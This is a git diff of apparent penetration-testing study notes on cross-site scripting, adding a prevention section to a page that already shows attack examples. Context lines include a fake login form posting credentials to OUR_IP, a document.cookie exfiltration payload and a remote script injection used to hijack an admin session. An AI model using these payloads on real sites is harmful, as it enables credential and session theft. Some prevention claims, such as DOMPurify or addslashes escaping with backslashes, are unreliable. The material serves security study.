@@ -264,7 +264,7 @@ python xsstrike.py -u "http://SERVER_IP:PORT/somepage.example?example=example"
 
 ### Login Form Injection
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption><p>we must inject an HTML code that displays a login form on the targeted page. This form should send the login information to a server we are listening on, such that once a user attempts to log in, we'd get their credentials.</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption><p>we must inject an HTML code that displays a login form on the targeted page. This form should send the login information to a server we are listening on, such that once a user attempts to log in, we'd get their credentials.</p></figcaption></figure>
 
 {% code overflow="wrap" %}
 ```
@@ -272,9 +272,9 @@ document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><inp
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption><p>the page should look as follows when we visit the malicious URL</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption><p>the page should look as follows when we visit the malicious URL</p></figcaption></figure>
 
 ### Session Hijacking
 
@@ -284,19 +284,82 @@ new Image().src='http://OUR_IP/?c='+document.cookie
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption><p>Write this js into a "script.js" file. You will need to serve this in a PHP server.</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption><p>Write this js into a "script.js" file. You will need to serve this in a PHP server.</p></figcaption></figure>
 
 ```
 "><script src="http://OUR_IP/script.js"></script>
 ```
 
-<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption><p>This is one of many payloads. This payload's main purpose is to have the victim's browser to send a request to our malicious PHP server and executing the code that will give us the cookie. </p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption><p>This is one of many payloads. This payload's main purpose is to have the victim's browser to send a request to our malicious PHP server and executing the code that will give us the cookie. </p></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption><p>The Victim's activity from the malicious PHP server perspective.</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption><p>The Victim's activity from the malicious PHP server perspective.</p></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption><p>Using the cookie editor to place our stolen cookie and then saving the changes</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption><p>Using the cookie editor to place our stolen cookie and then saving the changes</p></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption><p>Refresh the page and you will be logged in as that user in this case, admin</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption><p>Refresh the page and you will be logged in as that user in this case, admin</p></figcaption></figure>
+
+## XSS Prevention
+
+### **Input Validation**
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption><p>web application will not allow us to submit the form if the email format is invalid. This was done with the following JavaScript code. This code is testing the <code>email</code> input field and returning <code>true</code> or <code>false</code> whether it matches the Regex validation of an email format</p></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption><p>We should also ensure that we prevent XSS vulnerabilities with measures on the back-end to prevent Stored and Reflected XSS vulnerabilities</p></figcaption></figure>
+
+### Input Sanitization
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption><p>we should always ensure that we do not allow any input with JavaScript code in it, by escaping any special characters. For this, we can utilize the <a href="https://github.com/cure53/DOMPurify">DOMPurify</a> This will escape any special characters with a backslash <code>\</code>, which should help ensure that a user does not send any input with special characters (like JavaScript code), which should prevent vulnerabilities like DOM XSS.</p></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption><p>for a PHP back-end, we can use the <code>addslashes</code> function to sanitize user input by escaping special characters with a backslash. In any case, direct user input (e.g. <code>$_GET['email']</code>) should never be directly displayed on the page, as this can lead to XSS vulnerabilities</p></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption><p>For a NodeJS back-end, we can also use the <a href="https://github.com/cure53/DOMPurify">DOMPurify</a> library as we did with the front-end</p></figcaption></figure>
+
+### **Output HTML Encoding**
+
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption><p>Another important aspect to pay attention to in the back-end is <code>Output Encoding</code>. This means that we have to encode any special characters into their HTML codes, which is helpful if we need to display the entire user input without introducing an XSS vulnerability. For a PHP back-end, we can use the <code>htmlspecialchars</code> or the <code>htmlentities</code> functions, which would encode certain special characters into their HTML codes (e.g. <code>&#x3C;</code> into <code>&#x26;lt</code>), so the browser will display them correctly, but they will not cause any injection of any sort</p></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption><p>For a NodeJS back-end, we can use any library that does HTML encoding, like <code>html-entities</code>, as follows:</p></figcaption></figure>
+
+### **Direct Input**
+
+Never use user input directly within certain HTML tags, like:
+
+1. JavaScript code `<script></script>`
+2. CSS Style Code `<style></style>`
+3. Tag/Attribute Fields `<div name='INPUT'></div>`
+4. HTML Comments `<!-- -->`
+
+In addition, avoid using JavaScript functions that allow changing raw text of HTML fields, like:
+
+* `DOM.innerHTML`
+* `DOM.outerHTML`
+* `document.write()`
+* `document.writeln()`
+* `document.domain`
+
+jQuery:
+
+* `html()`
+* `parseHTML()`
+* `add()`
+* `append()`
+* `prepend()`
+* `after()`
+* `insertAfter()`
+* `before()`
+* `insertBefore()`
+* `replaceAll()`
+* `replaceWith()`
+
+### **Server Configuration**
+
+There are certain back-end web server configurations that may help in preventing XSS attacks, such as:
+
+* Using HTTPS across the entire domain.
+* Using XSS prevention headers.
+* Using the appropriate Content-Type for the page, like `X-Content-Type-Options=nosniff`.
+* Using `Content-Security-Policy` options, like `script-src 'self'`, which only allows locally hosted scripts.
+* Using the `HttpOnly` and `Secure` cookie flags to prevent JavaScript from reading cookies and only transport them over HTTPS.
 
 
 
